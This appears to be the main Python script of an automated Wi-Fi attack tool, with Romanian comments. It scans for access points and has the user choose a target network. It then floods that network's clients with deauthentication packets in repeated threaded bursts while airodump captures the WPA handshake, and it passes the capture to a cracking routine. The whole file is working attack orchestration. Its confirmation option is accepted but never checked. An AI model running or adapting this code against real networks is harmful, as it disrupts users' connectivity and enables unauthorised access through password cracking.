from pathlib import Path
import threading
import time
import os
import signal
import concurrent.futures
import argparse
import pprint
import sys


from monitor_mode import set_interfaces
from scanner import scan_once
from scan_parser import parse_scan, choose_ap_by_name, choose_strongest_ap
from scan_for_handshake import check_handshake, deauthenthicate, start_airodump_and_watch
from crack import crack_cap

def run(interactive: bool = True, iface: str | None = None, duration: int = 8, out_prefix: str | None = None, confirm: bool = True):
	if interactive:
		chosen = set_interfaces()
		if not chosen:
			print('No interface chosen. Exiting.')
			return 1
		iface_to_use = chosen
	else:
		if not iface:
			print('Non-interactive mode requires --iface')
			return 1
		iface_to_use = iface

	print(f'Using interface: {iface_to_use}')

	csv_path = scan_once(iface_to_use, duration=duration, out_prefix=out_prefix)
	if not csv_path:
		print('Scan did not produce a CSV file.')
		return 1

	print(f'Scan produced: {csv_path}')

	try:
		parsed = parse_scan(csv_path)
	except Exception as e:
		print('Failed to parse CSV:', e)
		return 1

	aps = parsed.get('aps', [])
	stations = parsed.get('stations', [])

	print('\n--- Scan summary ---')
	print('APs found:', len(aps))
	print('Stations found:', len(stations))

	if aps:
		print('\n--- Available APs ---')
		bssids = [ap.get('essid') for ap in aps if ap.get('bssid')]
		pprint.pprint(bssids)
		APname = input("Enter the ESSID of the AP to focus on: ")
		focus = choose_ap_by_name(aps, APname)
		print(focus if focus else f'No AP found matching ESSID: {APname}')

		if not focus:
			return 1

		print('\n--- Focused AP ---')
		pprint.pprint(focus)

		ok = False
		out_prefix = Path("handshake").with_suffix('')  
		cap_path = None
		proc = None

		result = {"proc": None, "cap_path": None, "handshake_detected": False}

		def airodump_thread():
			p, cap = start_airodump_and_watch(
				iface=iface_to_use,
				channel=focus['channel'],
				bssid_ap=focus['bssid'],
				out_prefix=out_prefix,
				timeout=600,  
			)
			result["proc"] = p
			result["cap_path"] = cap
			if p and cap:
				result["handshake_detected"] = True

		t = threading.Thread(target=airodump_thread, daemon=True)
		t.start()

		timeout = 300
		start_time = time.time()

		try:
			clients = [s.get('station') for s in stations if s.get('bssid') == focus.get('bssid') and s.get('station')]
			if not clients:
				print('No connected clients found in initial scan; proceeding with broadcast deauths')

			burst_interval = 1  

			max_workers = max(4, len(clients) if clients else 4)
			with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exe:
				while not ok and (time.time() - start_time) < timeout:
					futures = []

					if clients:
						for client in clients:
							futures.append(exe.submit(deauthenthicate, focus['bssid'], client, iface_to_use, 50))
					else:
						for i in range(10):
							futures.append(exe.submit(deauthenthicate, focus['bssid'], None, iface_to_use, 50))

					if not futures:
						time.sleep(burst_interval)
						continue

					for future in concurrent.futures.as_completed(futures, timeout=180):
						try:
							rc, out, err = future.result()
						except concurrent.futures.TimeoutError:
							print("A deauth task timed out.")
							continue
						except Exception as e:
							print(f"Deauth task raised exception: {e}")
							continue

						if rc != 0:
							err_msg = err.strip() if err else out.strip()
							print(f'Deauth to client failed (rc={rc}): {err_msg}')

					time.sleep(burst_interval)

					proc = result.get("proc")
					if result.get("cap_path"):
						cap_path = result.get("cap_path")

					if result.get("handshake_detected"):
						print("Handshake line detected in airodump stdout (fast). Verifying with .cap...")
						if cap_path and check_handshake(cap_path):
							print("Handshake confirmed from capture file (.cap).")
							ok = True
							try:
								crack_cap(cap_path)
							except Exception as e:
								print(f"Error occurred while cracking .cap file: {e}")
						else:
							print("Handshake reported in stdout but not yet verifiable in .cap — waiting briefly...")
							time.sleep(2)
							if cap_path and check_handshake(cap_path):
								print("Handshake confirmed after short wait.")
								ok = True
								try:
									crack_cap(cap_path)
								except Exception as e:
									print(f"Error occurred while cracking .cap file: {e}")
							break

					# fallback: dacă avem cap_path dar nu am detectat încă handshake în stdout, verificăm periodic .cap
					if cap_path and check_handshake(cap_path):
						print("Handshake detected by parsing capture file.")
						ok = True
						try:
							crack_cap(cap_path)
						except Exception as e:
							print(f"Error occurred while cracking .cap file: {e}")
						break

					print("No handshake captured yet, retrying deauth burst... (elapsed {:.0f}s)".format(time.time() - start_time))

		finally:
			try:
				proc = result.get("proc")
				if proc and getattr(proc, "pid", None):
					try:
						os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
					except Exception:
						try:
							proc.terminate()
						except Exception:
							pass
			except Exception:
				pass

	return 0

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='Run one scan and parse results')
	parser.add_argument('--no-interactive', action='store_true', help='Do not call interactive set_interfaces(); requires --iface')
	parser.add_argument('--iface', help='Interface to scan (non-interactive)')
	parser.add_argument('--duration', type=int, default=8, help='Scan duration in seconds')
	parser.add_argument('--outprefix', help='Output filename prefix for airodump (without suffix)')
	parser.add_argument('--yes', action='store_true', help='Do not prompt for confirmation before starting the scan')

	args = parser.parse_args()

	interactive = not args.no_interactive
	sys.exit(run(interactive=interactive, iface=args.iface, duration=args.duration, out_prefix=args.outprefix, confirm=not args.yes))


